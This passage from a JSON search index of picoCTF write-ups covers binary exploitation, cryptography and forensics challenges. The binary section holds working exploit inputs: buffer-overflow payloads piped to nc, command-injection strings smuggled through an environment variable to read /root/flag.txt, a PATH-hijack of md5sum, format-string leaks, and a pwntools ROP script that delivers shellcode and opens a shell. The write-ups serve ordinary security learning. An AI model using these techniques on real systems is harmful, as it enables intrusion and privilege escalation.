Hirosaki</p>"},{"location":"picoCTF/Binary%20Exploitation/CVE/","title":"CVE","text":"<p>Windows Print Spooler RCE Vulnerability (PrintNightmare)</p>"},{"location":"picoCTF/Binary%20Exploitation/PIE%20TIME/","title":"PIE TIME","text":"<pre><code>cat vuln.c\n</code></pre> <p>Need to provide address to the win() function</p> <pre><code>gdb ./vuln\n(gdb) info functions\n</code></pre> <p>main() is at <code>0x000000000000133d</code> and win() is at <code>0x00000000000012a7</code></p> <p>So, we just have to change 33d to 2a7 in the main() address provided when the binary is run</p>"},{"location":"picoCTF/Binary%20Exploitation/VNE/","title":"VNE","text":"<p>The binary seems to execute <code>ls $SECRET_DIR</code></p> <pre><code>env -i SECRET_DIR='-R / | grep -i \"flag\"' ./bin \n</code></pre> <p>There's a <code>flag.txt</code>, let's find it:</p> <pre><code>env -i SECRET_DIR='; find / -name \"flag.txt\"' ./bin \n</code></pre> <p>It is located at <code>/root/flag.txt</code></p> <pre><code>env -i SECRET_DIR=';cat /root/flag.txt' ./bin \n</code></pre>"},{"location":"picoCTF/Binary%20Exploitation/buffer%20overflow%200/","title":"buffer overflow 0","text":"<pre><code>void vuln(char *input){\n  char buf2[16];\n  strcpy(buf2, input);\n}\n</code></pre> <p>An input with 20+ bytes results in SIGSEGV, whose handler prints the flag</p>"},{"location":"picoCTF/Binary%20Exploitation/buffer%20overflow%201/","title":"buffer overflow 1","text":"<p>objdump tells addr of win() is <code>0x080491f6</code></p> <p>Trying different length of inputs more than 32 bytes helped to pinpoint where the return address (which is printed by the program) starts</p> <pre><code>python3 -c 'import sys; sys.stdout.buffer.write(b\"A\"*44 + b\"\\xf6\\x91\\x04\\x08\\n\")' | nc saturn.picoctf.net 58700\n</code></pre>"},{"location":"picoCTF/Binary%20Exploitation/buffer%20overflow%202/","title":"buffer overflow 2","text":"<ol> <li>vuln.c _. we need to call win() with two arguments: 0xCAFEF00D, 0xFOODFOOD</li> <li>GDB -&gt; set breakpoint in vuln() after gets(), run and give a string of a's as input</li> <li><code>disas win</code>, <code>i f</code> &amp; <code>x/100xg $ebp-200</code> give the following:<ul> <li>win() is at 0x08049296</li> <li>buffer starts at ebp-0x6c</li> </ul> </li> <li>We know that:<ul> <li>return address is at ebp+4</li> <li>first arg is at ebp+8</li> </ul> </li> <li> <p>The following works:</p> <p><code>shell python3 -c 'import sys; sys.stdout.buffer.write(b\"A\"*0x70 + b\"\\x96\\x92\\x04\\x08\" + b\"B\"*4 + b\"\\x0d\\xf0\\xfe\\xca\" + b\"\\x0d\\xf0\\x0d\\xf0\\n\")' | nc saturn.picoctf.net 50486</code></p> </li> </ol>"},{"location":"picoCTF/Binary%20Exploitation/flag%20leak/","title":"flag leak","text":"<p>Similar to this</p> <pre><code>Tell me a story and then I'll tell you one &gt;&gt; %p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p\nHere's a story - \n0xffb8aad00xffb8aaf00x80493460x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x70257025\n0x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x70257025\n0x702570250x702570250x702570250x702570250xf00070250x6f6369700x7b4654430x6b34334c0x5f676e310x67346c460x6666305f0x3474535f0x395f6b630x326539390x7d343238\n0xfbad20000xfc89700(nil)0xf0cfa9900x804c0000x8049410(nil)0x804c0000xffb8abb80x80494180x20xffb8ac640xffb8ac70(nil)0xffb8abd0(nil)(nil)0xf0af0ed5\n</code></pre> <pre><code>output = \"0xffb8aad00xffb8aaf00x80493460x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250xf00070250x6f6369700x7b4654430x6b34334c0x5f676e310x67346c460x6666305f0x3474535f0x395f6b630x326539390x7d3432380xfbad20000xfc89700\"\noutput = output.split(\"0x\")\nfor x in output:\n    try:\n        print(bytes.fromhex(x).decode('utf-8')[::-1], end=\"\")\n    except Exception as e:\n        pass\n</code></pre>"},{"location":"picoCTF/Binary%20Exploitation/format%20string%200/","title":"format string 0","text":"<p>In <code>serve_patrick()</code>, the options are: <code>{\"Breakf@st_Burger\", \"Gr%114d_Cheese\", \"Bac0n_D3luxe\"}</code></p> <pre><code>int count = printf(choice1);\n    if (count &gt; 2 * BUFSIZE) \n        serve_bob();\n</code></pre> <p>We have to get count &gt; 64; the option \"Gr%114d_Cheese\" works as %114d represents 114-digit integer</p> <p>In <code>serve_bob()</code>, the options are: <code>{\"Pe%to_Portobello\", \"$outhwest_Burger\", \"Cla%sic_Che%s%steak\"}</code></p> <p>We need to get a SIGSEGV (seg fault); the option \"Cla%sic_Che%s%steak\" works as %s expects a string which is not provided</p>"},{"location":"picoCTF/Binary%20Exploitation/format%20string%201/","title":"format string 1","text":"<p>Resource</p> <pre><code>Give me your order and I'll read it back to you:\n%s,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx\nHere's your order: Here's your order: ,0,720c01912a00,0,6a1880,a347834,7ffee1d339c0,720c01703e60,720c019284d0,1,7ffee1d33a90,0,0,7b4654436f636970,\n355f31346d316e34,3478345f33317937,34365f673431665f,7d363131373732,7,720c0192a8d8,2300000007,206e693374307250,a336c797453,9,720c0193bde9,720c0170c098,\n720c019284d0,0,7ffee1d33aa0,252c786c252c7325,252c786c252c786c,252c786c252c786c,252c786c252c786c,252c786c252c786c,252c786c252c786c,252c786c252c786c,\n252c786c252c786c,252c786c252c786c,252c786c252c786c,252c786c252c786c,252c786c252c786c,252c786c252c786c,252c786c252c786c,252c786c252c786c,252c786c252c786c,\n252c786c252c786c,252c786c252c786c,252c786c252c786c,252c786c252c786c,252c786c252c786c,252c786c252c786c,252c786c252c786c,252c786c252c786c,252c786c252c786c,\n252c786c252c786c,252c786c252c786c,252c786c252c786c,252c786c252c786c,252c786c252c786c,252c786c252c786c,252c786c252c786c,252c786c252c786c,252c786c252c786c,\n252c786c252c786c,252c786c252c786c,252c786c252c786c,252c786c252c786c,252c786c252c786c,252c786c252c786c,252c786c252c786c,252c786c252c786c,252c786c252c786c,\n252c786c252c786c,252c786c252c786c,252c786c252c786c,252c786c252c786c,252c786c252c786c,252c786c252c786c,252c786c252c786c,252c786c252c786c,252c786c252c786c,\n252c786c252c786c,252c786c252c786c,252c786c252c786c,252c786c252c786c,252c786c252c786c,252c786c252c786c,252c786c252c786c,252c786c252c786c,786c,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0\nBye!\n</code></pre> <pre><code>echo \"picoCTF{\" | xxd -p\n&gt; 7069636f4354467b0a\n</code></pre> <p>This matches (in reverse) with 7b4654436f636970</p> <pre><code>output = \"7b4654436f636970,355f31346d316e34,3478345f33317937,34365f673431665f,7d363131373732,7,720c0192a8d8,2300000007,206e693374307250,a336c797453,9,720c0193bde9,720c0170c098,720c019284d0,0,7ffee1d33aa0\"\noutput = output.split(\",\")\nfor x in output:\n    try:\n        print(bytes.fromhex(x).decode('utf-8')[::-1], end=\"\")\n    except Exception as e:\n        pass\n</code></pre>"},{"location":"picoCTF/Binary%20Exploitation/function%20overwrite/","title":"function overwrite","text":"<p>The program takes a <code>story</code> (max. 127 characters as input), and passes it onto the function pointed to by <code>check</code> \\ In normal flow, <code>check</code> points to <code>hard_checker()</code>, which is impossible to pass by a 127-byte story \\ On the other hand, <code>easy_checker()</code> can be passed; so must find a way to overwrite <code>check</code> to point to <code>easy_checker()</code></p> <pre><code>void (*check)(char*, size_t) = hard_checker;\nint fun[10] = {0};\n</code></pre> <pre><code>scanf(\"%d %d\", &amp;num1, &amp;num2);\n\nif (num1 &lt; 10)\n{\n    fun[num1] += num2;\n}\n\ncheck(story, strlen(story));\n</code></pre> <p><code>Hint: Don't be so negative</code></p> <p>We can pass appropriate negative value in <code>num1</code> to overwrite <code>check</code></p> <p>Dump of assembler code for <code>vuln()</code>:</p> <pre><code>    .\n    .\n    0x080495df &lt;+111&gt;:  call   0x8049180 &lt;__isoc99_scanf@plt&gt;\n    0x080495e4 &lt;+116&gt;:  add    esp,0x10\n    0x080495e7 &lt;+119&gt;:  mov    eax,DWORD PTR [ebp-0x8c]\n\n    if (num1 &lt; 10)\n    0x080495ed &lt;+125&gt;:  cmp    eax,0x9\n    0x080495f0 &lt;+128&gt;:  jg     0x8049614 &lt;vuln+164&gt;\n\n    fun[num1] += num2\n    0x080495f2 &lt;+130&gt;:  mov    eax,DWORD PTR [ebp-0x8c]\n    0x080495f8 &lt;+136&gt;:  mov    ecx,DWORD PTR [ebx+eax*4+0x80]\n    0x080495ff &lt;+143&gt;:  mov    edx,DWORD PTR [ebp-0x90]\n    0x08049605 &lt;+149&gt;:  mov    eax,DWORD PTR [ebp-0x8c]\n    0x0804960b &lt;+155&gt;:  add    edx,ecx\n    0x0804960d &lt;+157&gt;:  mov    DWORD PTR [ebx+eax*4+0x80],edx\n\n    check(story, strlen(story));\n    0x08049614 &lt;+164&gt;:  mov    esi,DWORD PTR [ebx+0x40]\n    0x0804961a &lt;+170&gt;:  sub    esp,0xc\n    0x0804961d &lt;+173&gt;:  lea    eax,[ebp-0x88]\n    0x08049623 &lt;+179&gt;:  push   eax\n    0x08049624 &lt;+180&gt;:  call   0x8049140 &lt;strlen@plt&gt;\n    0x08049629 &lt;+185&gt;:  add    esp,0x10\n    0x0804962c &lt;+188&gt;:  sub    esp,0x8\n    0x0804962f &lt;+191&gt;:  push   eax\n    0x08049630 &lt;+192&gt;:  lea    eax,[ebp-0x88]\n    0x08049636 &lt;+198&gt;:  push   eax\n    0x08049637 &lt;+199&gt;:  call   esi\n    .\n    .\n    .\n</code></pre> <pre><code>mov    DWORD PTR [ebx+eax*4+0x80],edx\nmov    esi,DWORD PTR [ebx+0x40]\n</code></pre> <p><code>fun[]</code> is at ebx+0x80, <code>checker</code> is at ebx+0x40 \\ eax = -16 -&gt; ebx+eax*4+0x80 = ebx+0x40</p> <p>Got the location to overwrite, now what should be <code>num2</code> to get the desired function overwrite? \\ <code>easy_checker()</code> is at 0x080492fc, <code>hard_checker()</code> is at 0x08049436; difference = 314</p> <p>Final input:</p> <ul> <li><code>story</code> = 'A'*20 + '%' (65*20 + 37 = 1337)</li> <li><code>num1</code> = -16</li> <li><code>num2</code> = -314</li> </ul>"},{"location":"picoCTF/Binary%20Exploitation/hash-only-1/","title":"hash-only-1","text":"<p>decompiling the binary gives:</p> <pre><code>setgid(0);\nsetuid(0);\n// ...\nsystem(\"/bin/bash -c 'md5sum /root/flag.txt'\");\n</code></pre> <p>system() call is made after elevating privileges to root...</p> <p>Create a malicious <code>md5sum</code> script in <code>/home/ctf-player/</code>:</p> <pre><code>#!/bin/bash\ncat \"$1\"\n</code></pre> <p>Give permissions, modify PATH and run the binary:</p> <pre><code>chmod 777 ./md5sum\nexport PATH=/home/ctf-player:$PATH\n./flaghasher\n</code></pre>"},{"location":"picoCTF/Binary%20Exploitation/heap%200/","title":"heap 0","text":"<p>The write buffer is 32 bytes away from safe_var, which has to be overwritten to anything other than \"bico\" \\ Overflow the buffer by entering atleast 32 bytes, and print the flag</p>"},{"location":"picoCTF/Binary%20Exploitation/heap%201/","title":"heap 1","text":"<p>The write buffer is 32 bytes away from safe_var, which has to be overwritten to \"pico\" \\ Overflow the buffer by entering 32 a's &amp; \"pico\", and print the flag</p>"},{"location":"picoCTF/Binary%20Exploitation/heap%202/","title":"heap 2","text":"<pre><code>void check_win() { ((void (*)())*(int*)x)(); }\n</code></pre> <p>The write buffer is 32 bytes away from x, which has to be overwritten to address of function <code>win()</code> \\ objdump or gdb gives the address: <code>0x00000000004011a0</code></p> <p>Pass this (after taking care of endianness) with 32 a's:</p> <pre><code>echo -e -n \"2\\naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\xa0\\x11\\x40\\x00\\x00\\x00\\x00\\x00\\n1\\n3\\n4\\n\" | nc mimas.picoctf.net 53134\n</code></pre>"},{"location":"picoCTF/Binary%20Exploitation/heap%203/","title":"heap 3","text":"<pre><code>typedef struct {\n  char a[10];\n  char b[10];\n  char c[10];\n  char flag[5];\n} object;\n</code></pre> <p>x-&gt;flag has to overwritten to \"pico\" \\ Free x, then allocate 35 bytes, then type: 30 a's &amp; pico \\</p>"},{"location":"picoCTF/Binary%20Exploitation/ropfu/","title":"ropfu","text":"<p>The hint and the source code clearly indicate towards ROP to get a shell</p> <ol> <li> <p>Get position of return address of vuln() from the input buffer</p> <ul> <li><code>gdb ./vuln</code> -&gt; <code>disas main</code> -&gt; vuln() ideally returns at 0x08049e1a</li> <li><code>disas vuln</code> -&gt; set a breakpoint just after gets()</li> <li><code>run</code> -&gt; give 10-15 a's as input -&gt; at breakpoint, <code>x/100xg $ebp-200</code></li> <li>return address spotted 28 bytes from the input</li> </ul> </li> <li> <p><code>checksec ./vuln</code> -&gt;  Arch:       i386-32-little, Stack:      Executable</p> <ul> <li>Can inject shellcode which to spawn shell, but the bytecode is too long for 28 bytes; can use NOP slide and a jump over address</li> <li>Find <code>jmp eax</code> gadget (rip jumps to eax, which stores the buffer, which will contain shellcode) -&gt; <code>ROPgadget --binary ./vuln  --only \"jmp|eax\"</code></li> </ul> </li> <li> <p>use <code>pwntools</code> to construct and send the payload:</p> <p>```python from pwn import *</p> </li> </ol>"},{"location":"picoCTF/Binary%20Exploitation/ropfu/#p-processvuln","title":"p = process('./vuln')","text":"<p>p = remote('saturn.picoctf.net', 61390) p.recvline() offset = 28 jmpshort = b'\\xeb\\x04' # jump over the address nop = b'\\x90' jmpeax = 0x0805333b shellcode = asm(shellcraft.i386.linux.sh())</p> <p>payload = nop*(offset-len(jmpshort)) + jmpshort + p32(jmpeax) + shellcode p.sendline(payload) p.interactive() ```</p> <p><code>shell [+] Opening connection to saturn.picoctf.net on port 61390: Done [*] Switching to interactive mode $ ls flag.txt vuln $ cat flag.txt picoCTF{5n47ch_7h3_5h311_4cbbb771}$</code></p>"},{"location":"picoCTF/Binary%20Exploitation/two-sum/","title":"two-sum","text":"<p>The challenge very clearly wants us to cause an integer overflow \\ The two numbers: 2147483647 1</p>"},{"location":"picoCTF/Cryptography/13/","title":"13","text":"<p>ROT13</p>"},{"location":"picoCTF/Cryptography/Dachshund%20Attacks/","title":"Dachshund Attacks","text":"<p>Small d, so weiner's attack:</p> <pre><code>from pwn import *\nimport owiener\nfrom Crypto.Util.number import long_to_bytes\n\nconn = remote('mercury.picoctf.net', 36463, level = 'debug')\nconn.recvline()\ne = int(conn.recvline().decode('utf-8').split(':')[1].strip())\nn = int(conn.recvline().decode('utf-8').split(':')[1].strip())\nc = int(conn.recvline().decode('utf-8').split(':')[1].strip())\n\nconn.close()\nd = owiener.attack(e, n)\nm = pow(c, d, n)\nprint(long_to_bytes(m).decode('utf-8'))\n</code></pre>"},{"location":"picoCTF/Cryptography/EVEN%20RSA%20CAN%20BE%20BROKEN%3F%3F%3F/","title":"EVEN RSA CAN BE BROKEN???","text":"<p>On requesting multiple times, we notice that N is always even</p> <pre><code>p = 2\nq = N//2\nphi = (p-1)*(q-1)\nd = inverse(e, phi)\nm = pow(c, d, N)\nprint(long_to_bytes(m).decode('utf-8'))\n</code></pre>"},{"location":"picoCTF/Cryptography/Flags/","title":"Flags","text":"<ul> <li>We are given an image with a series of Flag icons</li> <li>As we know the flag format if PICOCTF{}, we can get a part of the answer: P I C O C T F {F _ _ _ _ _ _ _ _ T _ F F}</li> <li>This seems more like an OSINT challenge. I searched for \"red,white,blue stripes flag\" (the icon for T) which led me to this wikipedia page, where I found Tango, and International maritime signal</li> <li>The wikipedia page for International Maritime Signal Flags contain all the icons given in the image and their corresponding alphabets/digits. Use this to decipher the flag.</li> </ul>"},{"location":"picoCTF/Cryptography/Guess%20My%20Cheese%20%28Part%201%29/","title":"Guess My Cheese (Part 1)","text":"<p><code>Hint: Remember that cipher we devised together Squeexy? The one that incorporates your affinity for linear equations???</code></p> <p>Clearly, Affine Cipher</p> <p>Use the oracle to encrypt types of cheese (Google it), I used FETA and BLUE, to get mappings of characters with small value, i.e., 'A' and 'B' \\</p> <pre><code>Suppose, 'A'(= 0) -&gt; x and 'B'(= 1) -&gt; y \\\na*0 + b = x mod 26 =&gt; b = x\na*1 + b = y mod 26 =&gt; a = (y-x)mod 26\n</code></pre> <p>Use these values on online tools to decipher the secret</p>"},{"location":"picoCTF/Cryptography/HideToSee/","title":"HideToSee","text":"<p>Extract (no passphrase):</p> <pre><code>steghide extract -sf atbash.jpg\n</code></pre> <p>Atbash cipher:</p> <pre><code>from Crypto.Util.number import inverse\n\nwith open('encrypted.txt', 'r') as file:\n    flag = file.read().strip()\n\n    for c in flag:\n        if not c.isalpha():\n            print(c, end='')\n        elif c.isupper():\n            print(chr(ord('Z')-(ord(c) - ord('A'))), end='')\n        else:\n            print(chr(ord('z')-(ord(c) - ord('a'))), end='')\n</code></pre>"},{"location":"picoCTF/Cryptography/Interencdec/","title":"Interencdec","text":"<pre><code>import base64\n\nwith open(\"enc_flag\", \"r\") as f:\n    enc_flag = f.read().strip()\n    f = base64.b64decode(enc_flag)\n    f = str(f)[4:-4]\n    f = base64.b64decode(f)\n    f = str(f)[2:-1]\n\n\n    def shift_letter(c, shift):\n        if 'a' &lt;= c &lt;= 'z':\n            return chr((ord(c) - ord('a') + shift) % 26 + ord('a'))\n        elif 'A' &lt;= c &lt;= 'Z':\n            return chr((ord(c) - ord('A') + shift) % 26 + ord('A'))\n        else:\n            return c\n\n    def shift_text(text, shift):\n        return ''.join(shift_letter(c, shift) for c in text)\n\n    for i in range(26):\n        print(shift_text(f, i))\n</code></pre>"},{"location":"picoCTF/Cryptography/Mind%20Your%20Ps%20and%20Qs/","title":"Mind Your Ps and Qs","text":"<p>Small N, so factorizable:</p> <pre><code>from factordb.factordb import FactorDB\nfrom Crypto.Util.number import long_to_bytes\n\nwith open(\"values\") as f:\n    f.readline()\n    c = int(f.readline().split(\":\")[1].strip())\n    n = int(f.readline().split(\":\")[1].strip())\n    e = int(f.readline().split(\":\")[1].strip())\n\n    fdb = FactorDB(n)\n    fdb.connect()\n    p, q = fdb.get_factor_list()\n    phi = (p - 1) * (q - 1)\n    d = pow(e, -1, phi)\n    m = pow(c, d, n)\n    print(long_to_bytes(m))\n</code></pre>"},{"location":"picoCTF/Cryptography/Mod%2026/","title":"Mod 26","text":"<p>ROT13</p>"},{"location":"picoCTF/Cryptography/Mr-Worldwide/","title":"Mr-Worldwide","text":"<p>The message:</p> <pre><code>picoCTF{(35.028309, 135.753082)(46.469391, 30.740883)(39.758949, -84.191605)(41.015137, 28.979530)(24.466667, 54.366669)(3.140853, 101.693207)_(9.005401, 38.763611)(-3.989038, -79.203560)(52.377956, 4.897070)(41.085651, -73.858467)(57.790001, -152.407227)(31.205753, 29.924526)}\n</code></pre> <p>These clearly look like coordinates. Using Google Maps:</p> <ul> <li>(35.028309, 135.753082): Kyota, Japan</li> <li>(46.469391, 30.740883): Odesa, Ukraine</li> <li>(39.758949, -84.191605): Dayto, Ohio, USA</li> <li>(41.015137, 28.979530): Istanbul, Turkiye</li> <li>(24.466667, 54.366669): Abu Dhabi, UAE</li> <li>(3.140853, 101.693207): Kuala Lumpur, Malaysia</li> <li>(9.005401, 38.763611): Addis Ababa, Ethiopia</li> <li>(-3.989038, -79.203560): Loja, Ecuador</li> <li>(52.377956, 4.897070):  Amsterdam, Netherlands</li> <li>(41.085651, -73.858467): Sleepy Hollow, New York, USA</li> <li>(57.790001, -152.407227): Kodiak, Alaska, USA</li> <li>(31.205753, 29.924526): Alexandria, Egypt</li> </ul> <p>Taking first letter of every city, we get the flag: KODIAK_ALASKA</p>"},{"location":"picoCTF/Cryptography/ReadMyCert/","title":"ReadMyCert","text":"<pre><code>openssl req -text -in readmycert.csr\n</code></pre>"},{"location":"picoCTF/Cryptography/Tapping/","title":"Tapping","text":"<ul> <li>This clearly is morse code</li> <li>Remove the curly braces and decode it</li> </ul>"},{"location":"picoCTF/Cryptography/The%20Numbers/","title":"The Numbers","text":"<pre><code>l = [16, 9 , 3, 15, 3, 20, 6, '{', 20, 8, 5, 14, 21, 13, 2, 5, 18, 19, 13, 1, 19, 15, 14, '}']\nfor x in l:\n    if type(x) == int:\n        print(chr(x+64), end=\"\")\n    else:\n        print(x, end=\"\")\n</code></pre>"},{"location":"picoCTF/Cryptography/Vigenere/","title":"Vigenere","text":"<p>Vigenere Cipher</p>"},{"location":"picoCTF/Cryptography/basic-mod1/","title":"basic-mod1","text":"<pre><code>with open('message.txt', 'r') as file:\n    l = file.read().split()\n    print(l)\n\n    for num in l:\n        num = int(num)%37\n        if num &lt; 26:\n            print(chr(num+ord('A')), end='')\n        elif num &lt; 36:\n            print(num-26, end='')\n        else:\n            print('_', end='')\n</code></pre>"},{"location":"picoCTF/Cryptography/basic-mod2/","title":"basic-mod2","text":"<pre><code>from Crypto.Util.number import inverse\n\nwith open('message.txt', 'r') as file:\n    l = file.read().split()\n    print(l)\n\n    for num in l:\n        num = int(num)%41\n        num = inverse(num,41)\n        if num &lt;= 26:\n            print(chr(num-1+ord('A')), end='')\n        elif num &lt;= 36:\n            print(num-27, end='')\n        else:\n            print('_', end='')\n</code></pre>"},{"location":"picoCTF/Cryptography/credstuff/","title":"credstuff","text":"<ol> <li> <p>Get line number:</p> <p><code>shell grep -n \"cultiris\" usernames.txt</code></p> </li> <li> <p>Get the password:</p> <p><code>shell head -n &lt;lineno&gt; passwords.txt | tail -n 1</code></p> </li> <li> <p>ROT13</p> </li> </ol>"},{"location":"picoCTF/Cryptography/hashcrack/","title":"haschcrack","text":"<p>Online hash decrypter</p> <ol> <li>MD5</li> <li>SHA1</li> <li>SHA256</li> </ol>"},{"location":"picoCTF/Cryptography/morse_code/","title":"morse_code","text":"<p>Use online tool to decode morse code from the audio file</p>"},{"location":"picoCTF/Cryptography/rotation/","title":"rotation","text":"<p>Caeser cipher</p>"},{"location":"picoCTF/Cryptography/rsa_oracle/","title":"rsa_oracle","text":"<p>Get the password:</p> <pre><code>from pwn import *\n\nconn = remote(\"titan.picoctf.net\", 63266, level='debug')\n\n# Encrypt 2\nconn.recvuntil('E --&gt; encrypt D --&gt; decrypt.')\nconn.sendline('E')\nconn.recvline()\nconn.sendline(\"\\x02\")\nres = conn.recvuntil('E --&gt; encrypt D --&gt; decrypt.').decode('utf-8')\ntwo = int(res.split('\\n')[4].split()[-1])\n\n# Decrypt encrypt(2)*pwd\nwith open('password.enc','r') as f:\n    pwd = int(f.read().strip())\n\nconn.sendline('D')\nconn.recvline()\nconn.sendline(str(two * pwd))\nres = conn.recvuntil('E --&gt; encrypt D --&gt; decrypt.').decode('utf-8')\nhex_value = res.split('\\n')[0].split()[-1]\n\n# Divide the result by 2 to get decrypt(pwd)\nm2 = int(hex_value, 16)\nm2 //= 2\npwd = bytes.fromhex(hex(m2)[2:]).decode('utf-8')\nprint(pwd)\n</code></pre> <p>Use the password in openssl decryption</p> <pre><code>openssl enc -aes-256-cbc -d -in secret.enc\n</code></pre>"},{"location":"picoCTF/Cryptography/substitution0/","title":"substitution0","text":"<pre><code>with open(\"message.txt\", \"r\") as file:\n    key = file.readline().strip()\n    message = file.read().strip()\n\n    for c in message:\n        if c.isalpha():\n            if c.islower():\n                print(chr(key.index(c.upper()) + ord('a')).lower(), end=\"\")\n            else:\n                print(chr(key.index(c) + ord('A')), end=\"\")\n        else:\n            print(c, end=\"\")\n</code></pre>"},{"location":"picoCTF/Cryptography/waves%20over%20lambda/","title":"waves over lambda","text":"<p>Substitution cipher</p>"},{"location":"picoCTF/Forensics/CanYouSee/","title":"CanYouSee","text":"<pre><code>unzip unknown.zip\nexiftool ukn_reality.jpg\n</code></pre> <p>The value of <code>Attribution URL</code> looks like a base64-encoded string; decode it:</p> <pre><code>echo \"&lt;decoded&gt;\" | base64 -d\n</code></pre>"},{"location":"picoCTF/Forensics/Event-Viewing/","title":"Event-Viewing","text":"<p><code>Hint 1:Try to filter the logs with the right event ID</code> \\ <code>Hint 2:What could the software have done when it was ran that causes the shutdowns every time the system starts up?</code></p> <p>Event IDs for the pieces:</p> <ol> <li>1033</li> <li>4657</li> <li>1074</li> </ol> <p>Decode (b64) the pieces</p>"},{"location":"picoCTF/Forensics/Glory%20of%20the%20Garden/","title":"Glory of the Garden","text":"<pre><code>strings garden.jpg \n</code></pre>"},{"location":"picoCTF/Forensics/Packets%20Primer/","title":"Packets Primer","text":"<p>Simply use Wireshark to look at packets' content</p>"},{"location":"picoCTF/Forensics/PcapPoisoning/","title":"PcapPoisoning","text":"<p>Analysing the packets using Wireshark tells that almost every packet has <code>Len=22</code>, \\ except packet 507 which has <code>Len=42</code></p>"},{"location":"picoCTF/Forensics/Ph4nt0m%201ntrud3r/","title":"Ph4nt0m 1ntrud3r","text":"<p>Open the pcap file in Wireshark \\ <code>Hint 2: Attacks were done in timely manner.</code></p> <p>Sort the packets by time. Decoding (base64) the TCP payload of the last few packets give the pieces of the flag</p>"},{"location":"picoCTF/Forensics/RED/","title":"RED","text":"<p><code>Hint 3: Check whatever Facebook is called now.</code></p> <p>Checking METAdata:</p> <pre><code>exiftool red.png\n&gt; Poem                            : Crimson heart, vibrant and bold,.Hearts flutter at your sight..Evenings glow softly red,.Cherries burst with sweet life..Kisses linger with your warmth..Love deep as merlot..Scarlet leaves falling softly,.Bold in every stroke.\nstrings red.png\n&gt;   Crimson heart, vibrant and bold,\n    Hearts flutter at your sight.\n    Evenings glow softly red,\n    Cherries burst with sweet life.\n    Kisses linger with your warmth.\n    Love deep as merlot.\n    Scarlet leaves falling softly,\n    Bold in every stroke.x\n</code></pre> <pre><code>Poem: Crimson heart, vibrant and bold,.\n    Hearts flutter at your sight..\n    Evenings glow softly red,.\n    Cherries burst with sweet life..\n    Kisses linger with your warmth..\n    Love deep as merlot..\n    Scarlet leaves falling softly,.\n    Bold in every stroke.\n</code></pre> <p>-&gt; C H E C K L S B, hmmm..</p> <p>Head on to CyberChef, Extract LSB with coulour pattern RGBA (<code>Hint 2: Red?Ged?Bed?Aed?</code>), decode (base64) the output</p>"},{"location":"picoCTF/Forensics/Scan%20Surprise/","title":"Scan Surprise","text":"<p>Just scan the QR Code</p>"},{"location":"picoCTF/Forensics/Secret%20of%20the%20Polyglot/","title":"Secret of the Polyglot","text":"<ol> <li> <p>Check file type:</p> <p><code>shell file flag2of2-final.pdf</code></p> <p>It's actually a PNG image.</p> </li> <li> <p>Copy the file to open as PNG:</p> <p><code>shell cp flag2of2-final.pdf flag.png</code></p> </li> </ol> <p>One half of the flag is in the PNG image, and the other in the PDF document.</p>"},{"location":"picoCTF/Forensics/Verify/","title":"Verify","text":"<ol> <li>Get <code>checksum</code> of the file to find from <code>checksum.txt</code></li> <li> <p>Find the file:</p> <p><code>shell sha256sum files/* | grep \"&lt;checksum&gt;\"</code></p> </li> <li> <p>Flag:</p> <p><code>shell decrypt.sh files/&lt;filename&gt;</code></p> </li> </ol>"},{"location":"picoCTF/Forensics/Wireshark%20doo%20dooo%20do%20doo.../","title":"Wireshark doo dooo do doo","text":"<p>Among all the POST requests, there are only two GET requests. \\ Response to one of them has the flag (have to use Caeser cipher)</p>"},{"location":"picoCTF/Forensics/flags%20are%20stepic/","title":"flags are stepic","text":"<p><code>Hint: In the country that doesn't exist, the flag persists</code></p> <p>Among all the countries shown, Upanzi Republic doesn't exist. Download its flag (upz.png) \\ Challenge name is a clear hint to Stepic Steganography</p> <pre><code>import stepic\nfrom PIL import Image\n\nimg = Image.open('upz.png')\nhidden_data = stepic.decode(img)\nprint(hidden_data)\n</code></pre>"},{"location":"picoCTF/Forensics/information/","title":"information","text":"<ol> <li> <p>Check out metadata:</p> <p><code>shell exiftool cat.jpg</code></p> </li> <li> <p>Value of License field seems b64-encoded; decode it:</p> <p><code>shell echo \"&lt;License&gt;\" | base64 -d</code></p> </li> </ol>"},{"location":"picoCTF/General%20Skills/Rust%20fixme%201/","title":"Rust fixme 1","text":"<p>The Rust Book</p> <p><code>cargo build</code> again and again until you get rid of all the errors</p> <p>The corrected code:</p> <pre><code>use xor_cryptor::XORCryptor;\n\nfn main() {\n    // Key for decryption\n    let key = String::from(\"CSUCKS\"); // How do we end statements in Rust?\n\n    // Encrypted flag values\n    let hex_values = [\"41\", \"30\", \"20\", \"63\", \"4a\", \"45\", \"54\", \"76\", \"01\", \"1c\", \"7e\", \"59\", \"63\", \"e1\", \"61\", \"25\", \"7f\", \"5a\", \"60\", \"50\", \"11\", \"38\", \"1f\", \"3a\", \"60\", \"e9\", \"62\", 